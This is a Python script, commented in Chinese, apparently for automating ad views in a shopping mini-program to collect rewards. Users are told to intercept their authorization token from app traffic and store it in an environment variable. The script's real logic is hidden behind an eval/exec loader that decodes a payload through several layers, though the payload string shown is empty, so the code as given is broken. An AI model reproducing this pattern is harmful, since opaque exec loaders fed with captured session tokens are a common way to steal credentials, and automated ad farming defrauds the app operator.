import requests
import json
import os
import hashlib
import time
'''#
打开链接扫图片二维码:https://q.jhzh66.com/uploads/poster/rec/recxcx/10654962.png
进入小程序抓包搜shop的链接
#'''
'''
环境变量名：JH_AT
# 2、抓带shop链接任意请求头里的authorization
#出这个本
脚本都是ai写的 我只是发一下
脚本都是ai写的 我只是发一下
免责声明:所发布的内容仅供学习，禁止用于其他用途，您必须在下载后的24小时内从计算机或手机中完全删除以上内容.严禁产生利益链！
Huaji保留随时更改或补充此免责声明的权利。一旦使用或复制了任何相关脚本或Script项目的规则，则视为您已接受此免责声明. 如您不同意，请马上删除该文件

'''
# 广告脚本配置
AD_TYPES = [15,10, 9, 8, 7, 6, 5, 4, 1, 2, 3]  # 广告类型列表 在app里广告只有123 其他的好像都是隐藏的 12，13
AD_WAIT_SECONDS = 10  # 广告等待秒数
PROGRESS_BAR_LENGTH = 10  # 进度条长度
AD_COUNT_PER_TYPE = 5  # 每种广告处理数量
PROGRESS_REFRESH_INTERVAL = 5  # 进度条刷新间隔
import base64,zlib,lzma,gzip,bz2
BASE62_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
def _base62_dec(d):
 d_s=d.decode();n=0
 for c in d_s:n=n*62+BASE62_CHARS.index(c)
 return n.to_bytes((n.bit_length()+7)//8,"big")if n else b"\x00"
def d(d,ops):
 for op in reversed(ops):
  d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else base64.b32decode(d)if op=="base32"else _base62_dec(d)if op=="base62"else base64.b85decode(d)
 return d.decode()
e,b="","WydiYXNlMzInLCAnbHptYScsICdiYXNlODUnLCAnYmFzZTY0JywgJ2d6aXAnLCAnemxpYidd";o=eval(base64.b64decode(b).decode())
try:exec(d(base64.b64decode(e),o))
except Exception as x:print(f"Error:{x}")